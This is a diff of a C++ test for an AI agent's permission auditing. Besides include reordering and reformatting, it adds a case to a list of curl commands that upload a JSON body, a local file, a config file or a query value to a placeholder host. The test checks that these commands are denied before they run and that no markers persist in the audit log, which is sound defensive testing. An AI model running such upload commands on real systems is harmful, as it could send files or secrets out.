@@ -6,9 +6,9 @@
 #include "ava/tools/spill_files.h"
 #include "ava/tools/webfetch_tool.h"
 #include "ava/tools/websearch_tool.h"
+#include "ava/session/session_store.h"
 #include "ava/permissions/permission.h"
 #include "ava/permissions/permission_rules.h"
-#include "ava/session/session_store.h"
 #include "ava/provider/provider.h"
 #include "ava/core/error.h"
 #include "ava/core/ids.h"
@@ -963,11 +963,9 @@ void test_payload_command_audits_persist_no_markers_or_recipes()
   std::filesystem::remove_all(root, cleanup);
   auto const workspace = root / "workspace";
   std::filesystem::create_directories(workspace);
-  expect(::chmod(root.c_str(), S_IRWXU) == 0 && ::chmod(workspace.c_str(), S_IRWXU) == 0,
-         "payload audit fixture keeps sealed planning roots owner-only");
+  expect(::chmod(root.c_str(), S_IRWXU) == 0 && ::chmod(workspace.c_str(), S_IRWXU) == 0, "payload audit fixture keeps sealed planning roots owner-only");
 
-  ava::session::SessionStore store(
-      ava::session::SessionStoreOptions{.root_dir = root / "sessions", .workspace_dir = workspace, .session_id = "payload-audit"});
+  ava::session::SessionStore store(ava::session::SessionStoreOptions{.root_dir = root / "sessions", .workspace_dir = workspace, .session_id = "payload-audit"});
   auto lease = ava::session::SessionLease::create_and_acquire(store.session_path());
   expect(lease.has_value(), "payload audit fixture acquires its persistent session lease");
   if (!lease)
@@ -980,9 +978,12 @@ void test_payload_command_audits_persist_no_markers_or_recipes()
     std::string marker;
   };
   std::vector<PayloadCase> const cases{
-      {.label = "json body", .command = "curl --json '{\"body\":\"payload-json-marker-492e\"}' https://example.test/upload", .marker = "payload-json-marker-492e"},
+      {.label = "json body",
+       .command = "curl --json '{\"body\":\"payload-json-marker-492e\"}' https://example.test/upload",
+       .marker = "payload-json-marker-492e"},
       {.label = "file payload", .command = "curl --data-binary @payload-file-marker-26ca https://example.test/upload", .marker = "payload-file-marker-26ca"},
       {.label = "config payload", .command = "curl --config payload-config-marker-8b17 https://example.test/upload", .marker = "payload-config-marker-8b17"},
+      {.label = "opaque URL query", .command = "curl 'https://example.test/upload?key=payload-query-marker-c213'", .marker = "payload-query-marker-c213"},
   };
 
   bool all_denied_before_execution = true;
@@ -996,10 +997,10 @@ void test_payload_command_audits_persist_no_markers_or_recipes()
         },
         .permission_audit_sink = [&store, &lease](ava::tools::PermissionAuditEvent const& event) -> ava::core::VoidResult {
           return store.append(*lease, ava::session::SessionEntry{.id = ava::core::make_id("entry"),
-                                                                  .parent_id = {},
-                                                                  .type = ava::session::EntryType::PermissionDecision,
-                                                                  .timestamp = ava::session::now_timestamp(),
-                                                                  .data_json = ava::tools::permission_audit_data_json(event)});
+                                                                 .parent_id = {},
+                                                                 .type = ava::session::EntryType::PermissionDecision,
+                                                                 .timestamp = ava::session::now_timestamp(),
+                                                                 .data_json = ava::tools::permission_audit_data_json(event)});
         },
         .redact_permission_audit_arguments = false,
     };
